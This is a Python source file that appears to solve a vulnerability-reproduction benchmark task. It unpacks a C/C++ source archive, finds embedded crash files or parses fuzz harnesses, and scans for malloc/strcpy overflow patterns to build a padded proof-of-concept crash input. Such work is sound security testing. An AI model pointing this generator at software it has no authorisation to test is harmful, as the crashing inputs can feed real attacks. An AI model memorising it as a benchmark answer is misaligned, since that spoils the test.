import os
import re
import io
import tarfile
import zipfile
import tempfile
import shutil
from typing import List, Optional, Tuple, Dict


_C_EXTS = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inc", ".inl"}


def _is_within_directory(base_dir: str, target_path: str) -> bool:
    base_dir = os.path.realpath(base_dir)
    target_path = os.path.realpath(target_path)
    if base_dir == target_path:
        return True
    return target_path.startswith(base_dir + os.sep)


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        members = []
        for m in tf.getmembers():
            name = m.name
            if not name or name == ".":
                continue
            out_path = os.path.join(dst_dir, name)
            if not _is_within_directory(dst_dir, out_path):
                continue
            members.append(m)
        tf.extractall(dst_dir, members=members)


def _safe_extract_zip(zip_path: str, dst_dir: str) -> None:
    with zipfile.ZipFile(zip_path) as zf:
        for info in zf.infolist():
            name = info.filename
            if not name or name.endswith("/") or name == ".":
                continue
            out_path = os.path.join(dst_dir, name)
            if not _is_within_directory(dst_dir, out_path):
                continue
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with zf.open(info, "r") as src, open(out_path, "wb") as dst:
                shutil.copyfileobj(src, dst, length=1024 * 1024)


def _extract_src(src_path: str, tmp_dir: str) -> str:
    if os.path.isdir(src_path):
        return os.path.realpath(src_path)
    lp = src_path.lower()
    os.makedirs(tmp_dir, exist_ok=True)
    extracted = os.path.join(tmp_dir, "src")
    os.makedirs(extracted, exist_ok=True)
    if lp.endswith(".zip"):
        _safe_extract_zip(src_path, extracted)
    else:
        _safe_extract_tar(src_path, extracted)

    try:
        entries = [e for e in os.listdir(extracted) if e not in (".", "..")]
    except OSError:
        return extracted
    if len(entries) == 1:
        candidate = os.path.join(extracted, entries[0])
        if os.path.isdir(candidate):
            return candidate
    return extracted


def _walk_files(root: str) -> List[str]:
    out = []
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "__pycache__", "build", "out", "dist"}]
        for fn in filenames:
            out.append(os.path.join(dirpath, fn))
    return out


def _read_text_limited(path: str, limit: int = 2 * 1024 * 1024) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
    except OSError:
        return ""
    try:
        return data.decode("utf-8", "ignore")
    except Exception:
        return ""


def _c_unescape_to_bytes(s: str) -> bytes:
    out = bytearray()
    i = 0
    n = len(s)
    while i < n:
        ch = s[i]
        if ch != "\\":
            out.append(ord(ch) & 0xFF)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append(ord("\\"))
            break
        esc = s[i]
        i += 1
        if esc == "n":
            out.append(0x0A)
        elif esc == "r":
            out.append(0x0D)
        elif esc == "t":
            out.append(0x09)
        elif esc == "\\":
            out.append(0x5C)
        elif esc == "'":
            out.append(0x27)
        elif esc == '"':
            out.append(0x22)
        elif esc == "0":
            j = i
            while j < n and len(out) < 10 and s[j] in "01234567":
                j += 1
            if j > i:
                try:
                    out.append(int(s[i:j], 8) & 0xFF)
                except Exception:
                    out.append(0x00)
                i = j
            else:
                out.append(0x00)
        elif esc in "xX":
            if i + 1 <= n:
                hx = s[i:i+2]
                if len(hx) == 2 and all(c in "0123456789abcdefABCDEF" for c in hx):
                    try:
                        out.append(int(hx, 16) & 0xFF)
                        i += 2
                    except Exception:
                        out.append(ord("x"))
                else:
                    out.append(ord("x"))
            else:
                out.append(ord("x"))
        else:
            out.append(ord(esc) & 0xFF)
    return bytes(out)


def _find_embedded_poc(root: str) -> Optional[bytes]:
    name_re = re.compile(r"(?:^|[^a-z])(crash|poc|repro|asan|ubsan|heap|overflow)(?:[^a-z]|$)", re.I)
    candidates: List[Tuple[int, str]] = []
    for p in _walk_files(root):
        try:
            st = os.stat(p)
        except OSError:
            continue
        if st.st_size <= 0 or st.st_size > 128:
            continue
        base = os.path.basename(p)
        if name_re.search(base) or name_re.search(os.path.dirname(p)):
            candidates.append((st.st_size, p))
    candidates.sort()
    for _, p in candidates[:20]:
        try:
            with open(p, "rb") as f:
                data = f.read()
            if 0 < len(data) <= 128:
                return data
        except OSError:
            continue
    return None


def _find_fuzz_harnesses(root: str) -> List[str]:
    harnesses = []
    for p in _walk_files(root):
        ext = os.path.splitext(p)[1].lower()
        if ext not in _C_EXTS:
            continue
        txt = _read_text_limited(p, limit=1024 * 1024)
        if "LLVMFuzzerTestOneInput" in txt or "DEFINE_FUZZER" in txt or "FUZZER_TEST" in txt:
            harnesses.append(p)
    return harnesses


def _compute_min_size_from_harness(text: str) -> int:
    min_size = 0
    lines = text.splitlines()
    pat_lt = re.compile(r"\bif\s*\(\s*(?:size|Size|data_size|DataSize|len|Len|input_size|InputSize)\s*<\s*(\d+)\s*\)")
    pat_le = re.compile(r"\bif\s*\(\s*(?:size|Size|data_size|DataSize|len|Len|input_size|InputSize)\s*<=\s*(\d+)\s*\)")
    pat_eq0 = re.compile(r"\bif\s*\(\s*(?:size|Size|data_size|DataSize|len|Len|input_size|InputSize)\s*==\s*0\s*\)")
    pat_not = re.compile(r"\bif\s*\(\s*!\s*(?:size|Size|data_size|DataSize|len|Len|input_size|InputSize)\s*\)")
    for ln in lines:
        if "return" not in ln:
            continue
        m = pat_lt.search(ln)
        if m:
            try:
                v = int(m.group(1))
                if v > min_size:
                    min_size = v
            except Exception:
                pass
        m = pat_le.search(ln)
        if m:
            try:
                v = int(m.group(1)) + 1
                if v > min_size:
                    min_size = v
            except Exception:
                pass
        if pat_eq0.search(ln) or pat_not.search(ln):
            if min_size < 1:
                min_size = 1
    return min_size


def _extract_prefix_constraints_from_harness(text: str) -> List[bytes]:
    constraints: List[bytes] = []
    for ln in text.splitlines():
        if "return" not in ln:
            continue

        m = re.search(r"\bif\s*\(\s*data\s*\[\s*0\s*\]\s*!=\s*'((?:\\.|[^\\'])+)'\s*\)", ln)
        if m:
            b = _c_unescape_to_bytes(m.group(1))
            if b:
                constraints.append(b[:1])

        m = re.search(r"\bif\s*\(\s*data\s*\[\s*0\s*\]\s*!=\s*(0x[0-9a-fA-F]+|\d+)\s*\)", ln)
        if m:
            try:
                v = int(m.group(1), 0) & 0xFF
                constraints.append(bytes([v]))
            except Exception:
                pass

        mm = re.search(r"\bmemcmp\s*\(\s*data\s*,\s*\"((?:\\.|[^\\\"])*)\"\s*,\s*(\d+)\s*\)\s*!=\s*0", ln)
        if mm:
            lit = _c_unescape_to_bytes(mm.group(1))
            try:
                n = int(mm.group(2))
            except Exception:
                n = len(lit)
            if n > 0 and len(lit) >= n:
                constraints.append(lit[:n])

        mm = re.search(r"\bstrncmp\s*\(\s*\(?\s*const\s+char\s*\*\s*\)?\s*data\s*,\s*\"((?:\\.|[^\\\"])*)\"\s*,\s*(\d+)\s*\)\s*!=\s*0", ln)
        if mm:
            lit = _c_unescape_to_bytes(mm.group(1))
            try:
                n = int(mm.group(2))
            except Exception:
                n = len(lit)
            if n > 0 and len(lit) >= n:
                constraints.append(lit[:n])

        mm = re.search(r"\.starts_with\s*\(\s*\"((?:\\.|[^\\\"])*)\"\s*\)", ln)
        if mm:
            lit = _c_unescape_to_bytes(mm.group(1))
            if lit:
                constraints.append(lit)

        mm = re.search(r"\brfind\s*\(\s*\"((?:\\.|[^\\\"])*)\"\s*,\s*0\s*\)\s*!=\s*0", ln)
        if mm:
            lit = _c_unescape_to_bytes(mm.group(1))
            if lit:
                constraints.append(lit)

        mm = re.search(r"\bcompare\s*\(\s*0\s*,\s*(\d+)\s*,\s*\"((?:\\.|[^\\\"])*)\"\s*\)\s*!=\s*0", ln)
        if mm:
            try:
                n = int(mm.group(1))
            except Exception:
                n = 0
            lit = _c_unescape_to_bytes(mm.group(2))
            if n > 0 and len(lit) >= n:
                constraints.append(lit[:n])

    return constraints


def _pick_compatible_prefix(constraints: List[bytes]) -> bytes:
    if not constraints:
        return b""
    constraints = [c for c in constraints if c]
    constraints.sort(key=lambda x: len(x), reverse=True)
    best = constraints[0]
    for c in constraints[1:]:
        if len(c) <= len(best) and best.startswith(c):
            continue
        if len(best) <= len(c) and c.startswith(best):
            best = c
            continue
        return b""
    return best


def _estimate_vuln_min_len(root: str) -> int:
    best_rel = -1
    best_min = None

    assign_const_malloc = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*(?:\([^)]*\)\s*)?malloc\s*\(\s*(\d{1,4})\s*\)\s*;",
        re.M,
    )
    assign_const_new = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*new\s+char\s*\[\s*(\d{1,4})\s*\]\s*;",
        re.M,
    )
    assign_strlen_malloc = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*(?:\([^)]*\)\s*)?malloc\s*\(\s*strlen\s*\(\s*([^)]+?)\s*\)\s*\)\s*;",
        re.M,
    )
    assign_strlen_new = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*new\s+char\s*\[\s*strlen\s*\(\s*([^)]+?)\s*\)\s*\]\s*;",
        re.M,
    )
    use_strcpy = re.compile(r"\bstrcpy\s*\(\s*([A-Za-z_]\w*)\s*,")
    use_strcat = re.compile(r"\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,")
    use_sprintf = re.compile(r"\bsprintf\s*\(\s*([A-Za-z_]\w*)\s*,")
    use_memcpy = re.compile(r"\bmemcpy\s*\(\s*([A-Za-z_]\w*)\s*,")
    use_strlen_plus1 = re.compile(r"\bstrlen\s*\([^)]*\)\s*\+\s*1")

    for p in _walk_files(root):
        ext = os.path.splitext(p)[1].lower()
        if ext not in _C_EXTS:
            continue
        try:
            st = os.stat(p)
        except OSError:
            continue
        if st.st_size <= 0 or st.st_size > 4 * 1024 * 1024:
            continue

        lowername = os.path.basename(p).lower()
        rel = 0
        if "dash" in lowername:
            rel += 3
        if "client" in lowername:
            rel += 3
        if "fuzz" in lowername:
            rel += 2

        txt = _read_text_limited(p, limit=2 * 1024 * 1024)
        if not txt:
            continue
        lowertxt = txt.lower()
        if "dash_client" in lowertxt or "dashclient" in lowertxt:
            rel += 4

        lines = txt.splitlines()
        var_alloc: Dict[str, Tuple[int, int, str]] = {}
        for i, ln in enumerate(lines):
            m = assign_const_malloc.search(ln)
            if m:
                var = m.group(1)
                try:
                    k = int(m.group(2))
                except Exception:
                    k = 0
                if 1 <= k <= 256:
                    var_alloc[var] = (k, i, "const")
                continue
            m = assign_const_new.search(ln)
            if m:
                var = m.group(1)
                try:
                    k = int(m.group(2))
                except Exception:
                    k = 0
                if 1 <= k <= 256:
                    var_alloc[var] = (k, i, "const")
                continue
            m = assign_strlen_malloc.search(ln)
            if m:
                var = m.group(1)
                var_alloc[var] = (0, i, "strlen")
                continue
            m = assign_strlen_new.search(ln)
            if m:
                var = m.group(1)
                var_alloc[var] = (0, i, "strlen")
                continue

        candidates: List[int] = []
        if var_alloc:
            for i, ln in enumerate(lines):
                for use_re in (use_strcpy, use_strcat, use_sprintf, use_memcpy):
                    mu = use_re.search(ln)
                    if not mu:
                        continue
                    var = mu.group(1)
                    if var not in var_alloc:
                        continue
                    k, alloc_line, kind = var_alloc[var]
                    if i < alloc_line or i > alloc_line + 30:
                        continue
                    if kind == "strlen":
                        if use_re in (use_strcpy, use_strcat, use_sprintf) or (use_re is use_memcpy and use_strlen_plus1.search(ln)):
                            candidates.append(1)
                    else:
                        if use_re in (use_strcpy, use_strcat, use_sprintf):
                            candidates.append(max(1, k))
                        elif use_re is use_memcpy:
                            candidates.append(max(1, k + 1))

        file_min = min(candidates) if candidates else None
        if file_min is None:
            continue

        if rel > best_rel:
            best_rel = rel
            best_min = file_min
        elif rel == best_rel and best_min is not None and file_min < best_min:
            best_min = file_min

    if best_min is None:
        return 9
    if best_min < 1:
        best_min = 1
    if best_min > 1024:
        best_min = 1024
    return best_min


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp(prefix="pocgen_")
        try:
            root = _extract_src(src_path, tmp)

            embedded = _find_embedded_poc(root)
            if embedded is not None:
                return embedded

            harnesses = _find_fuzz_harnesses(root)
            harness_path = None
            if harnesses:
                harnesses.sort(key=lambda p: (("dash" not in p.lower()), ("client" not in p.lower()), len(p)))
                harness_path = harnesses[0]

            harness_min = 0
            prefix = b""
            if harness_path:
                htxt = _read_text_limited(harness_path, limit=1024 * 1024)
                harness_min = _compute_min_size_from_harness(htxt)
                constraints = _extract_prefix_constraints_from_harness(htxt)
                prefix = _pick_compatible_prefix(constraints)

            vuln_min = _estimate_vuln_min_len(root)

            final_len = max(1, harness_min, vuln_min, len(prefix))
            if final_len > 4096:
                final_len = 4096

            if len(prefix) > final_len:
                prefix = prefix[:final_len]
            fill_len = final_len - len(prefix)
            data = prefix + (b"A" * fill_len)
            if len(data) == 0:
                data = b"A"
            return data
        finally:
            shutil.rmtree(tmp, ignore_errors=True)